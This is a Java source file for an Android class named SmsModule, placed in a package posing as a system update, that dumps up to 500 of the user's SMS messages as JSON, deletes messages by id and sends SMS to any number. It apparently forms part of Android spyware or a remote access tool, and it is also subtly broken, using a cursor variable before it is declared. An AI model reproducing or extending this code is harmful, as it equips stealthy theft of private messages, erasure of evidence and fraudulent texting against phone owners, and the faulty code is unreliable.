package com.android.system.update.modules;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Base64;
import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsModule {
    private Context context;
    
    public SmsModule(Context context) {
        this.context = context;
    }
    
   public String getSms() {
       int idIdx = cursor.getColumnIndex("_id");
    if (!checkReadPermission()) return "ERROR: No SMS read permission";

    try {
        JSONArray smsList = new JSONArray();
        ContentResolver cr = context.getContentResolver();

        // Query ALL SMS (inbox + sent + drafts) — no LIMIT in the selection
        // Sort newest first, cap at 500 to avoid huge payloads
        Cursor cursor = cr.query(
            Uri.parse("content://sms"),
            new String[]{"_id", "address", "body", "date", "type", "read"},
            null,
            null,
            "date DESC"
        );

        int count = 0;
        final int MAX_SMS = 500;

        if (cursor != null && cursor.moveToFirst()) {
            int addressIdx = cursor.getColumnIndex("address");
            int bodyIdx    = cursor.getColumnIndex("body");
            int dateIdx    = cursor.getColumnIndex("date");
            int typeIdx    = cursor.getColumnIndex("type");
            int readIdx    = cursor.getColumnIndex("read");

            do {
                JSONObject sms = new JSONObject();
                sms.put("address", cursor.getString(addressIdx));
                sms.put("body",    cursor.getString(bodyIdx));
                sms.put("date",    cursor.getLong(dateIdx));
                sms.put("id", cursor.getLong(idIdx));   // add alongside address/body/date
                // type: 1 = inbox, 2 = sent, 3 = draft, 4 = outbox, 5 = failed
                int type = cursor.getInt(typeIdx);
                switch (type) {
                    case 1:  sms.put("type", "inbox");  break;
                    case 2:  sms.put("type", "sent");   break;
                    case 3:  sms.put("type", "draft");  break;
                    default: sms.put("type", "other");  break;
                }

                sms.put("read", cursor.getInt(readIdx) == 1);
                smsList.put(sms);
                count++;
            } while (cursor.moveToNext() && count < MAX_SMS);

            cursor.close();
        }

        return smsList.toString();

    } catch (Exception e) {
        e.printStackTrace();
        return "ERROR: " + e.getMessage();
    }
}
    public String deleteSms(long smsId) {
    try {
        Uri uri = Uri.parse("content://sms/" + smsId);
        int deleted = context.getContentResolver().delete(uri, null, null);
        if (deleted > 0) {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("deleted_id", smsId);
            result.put("message", "SMS deleted successfully");
            return result.toString();
        } else {
            JSONObject result = new JSONObject();
            result.put("success", false);
            result.put("error", "No message found with id: " + smsId);
            return result.toString();
        }
    } catch (Exception e) {
        try {
            JSONObject result = new JSONObject();
            result.put("success", false);
            result.put("error", e.getMessage());
            return result.toString();
        } catch (Exception ignored) {
            return "{\"success\":false,\"error\":\"Unknown error\"}";
        }
    }
}
    public String sendSms(String number, String message) {
        if (!checkSendPermission()) return "ERROR: No SMS send permission";
        
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            return "SMS sent to " + number;
        } catch (Exception e) {
            e.printStackTrace();
            return "ERROR: " + e.getMessage();
        }
    }
    
    private boolean checkReadPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkSendPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
            == PackageManager.PERMISSION_GRANTED;
    }
}
